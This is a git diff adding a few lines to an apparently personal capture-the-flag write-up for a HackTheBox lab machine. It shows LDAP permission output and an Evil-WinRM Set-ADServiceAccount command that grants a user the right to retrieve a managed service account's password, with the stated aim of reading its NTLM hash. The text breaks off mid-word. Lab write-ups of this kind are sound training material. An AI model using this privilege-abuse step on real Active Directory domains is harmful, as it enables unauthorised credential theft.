@@ -449,4 +449,9 @@ permission: CREATE_CHILD
 distinguishedName: DC=_msdcs.haze.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=haze,DC=htb
 permission: CREATE_CHILD
 ```
-So i have write access on this, so i should be able to add the wrigh
+So i have write access on this, so i should be able to add the right to make it so i can read the NTLM
+
+```python
+*Evil-WinRM* PS C:\Users\mark.adams\Desktop> Set-ADServiceAccount Haze-IT-Backup -PrincipalsAllowedToRetrieveManagedPassword "mark.adams"
+```
+Now i cho
